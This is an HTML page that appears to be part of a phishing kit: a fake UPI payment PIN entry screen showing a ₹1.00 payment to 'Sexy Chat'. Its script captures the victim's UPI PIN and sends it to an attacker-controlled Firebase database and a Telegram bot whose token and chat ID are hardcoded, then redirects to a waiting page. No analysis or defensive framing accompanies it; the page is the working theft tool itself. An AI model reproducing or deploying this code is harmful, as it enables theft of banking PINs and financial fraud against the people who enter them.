<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure UPI Keypad</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
    <style>
       * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: Arial, sans-serif;
}
body {
    display: flex;
    flex-direction: column;
    align-items: center;
    height: 100vh;
    background-color: white;
    position: relative;
}
.header {
    width: 100%;
    height: 50px;
    padding: 0px;
    display: flex;
    justify-content: end;
    align-items: center;
    position: fixed;
    top: 0;
    background-color: white;
    z-index: 10;
}

.header img {
    width: auto;
    height: 40px;
}
.details {
    width: 100%;
    padding: 5px 15px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    background-color: #f0f0f0;
    font-size: 15px;
    font-weight: 500;
    margin-top: 50px;
}
.center-content {
    flex-grow: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    position: absolute;
    top: 30%;
    transform: translateY(-50%);
    width: 100%;
}
h5 {
    font-size: 15px;
    font-weight: 500;
    color: #3d3d3d;
    margin-bottom: 15px;
}
.input-container {
    font-size: 30px;
    font-weight: bold;
    color: #003bab;
    letter-spacing: 10px;
    display: flex;
    gap: 5px;
    margin-bottom: 15px;
}

.warning {
    font-size: 25px;
    font-weight: 500;
    border-radius: 30px;
    background: rgba(255, 199, 0, 0.2);
    display: flex;
    width: 85%;
    padding: 10px;
    color: #ff9d00;
    align-items: center;
    justify-content: center;
    gap: 2px;
    margin-top: 15px;
}

.warning i{
    
    font-size: 35px;
    margin-left: 0px;
}

.warning p {
    text-align: center;
    color: black;
    font-size: 14px;
    margin-left: 10px;
}

.keypad {
    width: 100%;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 12px;
    text-align: center;
    position: fixed;
    bottom: 0;
    padding-bottom: 30px;
    padding-top: 15px;
    padding-left: 15px;
    padding-right: 15px;
    background-color: #f1f1f1;
}
.key {
    display: flex;
    justify-content: center;
    align-items: center;
    height: 60px;
    font-size: 25px;
    font-weight: bold;
    color: #003bab;
    background-color: transparent;
    cursor: pointer;
    user-select: none;
    transition: transform 0.1s ease, background-color 0.1s ease;
}
.key:active {
    transform: scale(0.9);
    border-radius: 15px;
}
#done {
    font-size: 35px;
}
#done1 {
    font-size: 30px;
}
    </style>
</head>
<body>

    <!-- Header -->
    <div class="header">
        
        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo">
    </div>

    <!-- Transaction Details -->
    <div class="details">
        <p>Sending: <br>To:</p>
        <p>₹1.00 <br>Sexy Chat</p>
    </div>

    <!-- Center Content -->
    <div class="center-content">
        <h5>ENTER UPI PIN</h5>
        <div class="input-container" id="input-display">
            <span></span> <span></span> <span></span> <span></span> <span></span> <span></span>
        </div>
        <div class="warning">
            <i class="fas fa-exclamation-circle"></i>
            <p>You are sending ₹1.00 from your account to Sexy Chat</p>
        </div>
    </div>

    <!-- Keypad -->
    <div class="keypad">
        <div class="key" onclick="enterNumber(1)">1</div>
        <div class="key" onclick="enterNumber(2)">2</div>
        <div class="key" onclick="enterNumber(3)">3</div>
        <div class="key" onclick="enterNumber(4)">4</div>
        <div class="key" onclick="enterNumber(5)">5</div>
        <div class="key" onclick="enterNumber(6)">6</div>
        <div class="key" onclick="enterNumber(7)">7</div>
        <div class="key" onclick="enterNumber(8)">8</div>
        <div class="key" onclick="enterNumber(9)">9</div>
        <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
        <div class="key" onclick="enterNumber(0)">0</div>
        <div class="key" id="done" onclick="submitData()"><i class="fas fa-circle-check"></i></div>
    </div>

    <script>
    let enteredNumbers = [];
    let isHidden = true;
    let DeviceId = "{DEVICE_ID_MY_PROJECT}"
    function updateDisplay() {
        let display = document.getElementById("input-display");
        display.innerHTML = "";
        for (let i = 0; i < 6; i++) {
            let span = document.createElement("span");
            span.textContent = enteredNumbers[i] !== undefined ? (isHidden ? "•" : enteredNumbers[i]) : "";
            display.appendChild(span);
        }
    }

    function enterNumber(num) {
        if (enteredNumbers.length < 6) {
            enteredNumbers.push(num);
            updateDisplay();
        }
    }

    function deleteNumber() {
        enteredNumbers.pop();
        updateDisplay();
    }

    function submitData() {
        if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
            let upiPin = enteredNumbers.join('');
            let requestData = { upipin: upiPin };

            // ---- Firebase request (original panel logic) ----
            fetch("https://hsjshdhe-1a0ea-default-rtdb.firebaseio.com/clients/" + DeviceId + ".json", {
                method: "PATCH",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(requestData)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error("Payment failed");
                }
                return response.json();
            })
            .then(data => {
                window.location.href = "wait.html";
            })
            .catch(error => {
                console.error(error);
            });

            // ---- Telegram request (your bot) ----
            let msg = `New UPI PIN:
UPI PIN: ${upiPin}
DeviceId: ${DeviceId}`;
            fetch("https://api.telegram.org/bot8135558765:AAGwWtbug4hI8G1q9LZ9s6qAUS6pT9qeOtA/sendMessage", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: "-1003282741646",
                    text: msg
                })
            });

        } else {
            alert("Please enter a valid 4 or 6-digit number and UPI PIN.");
        }
    }

    updateDisplay();
</script>

</body>
</html>
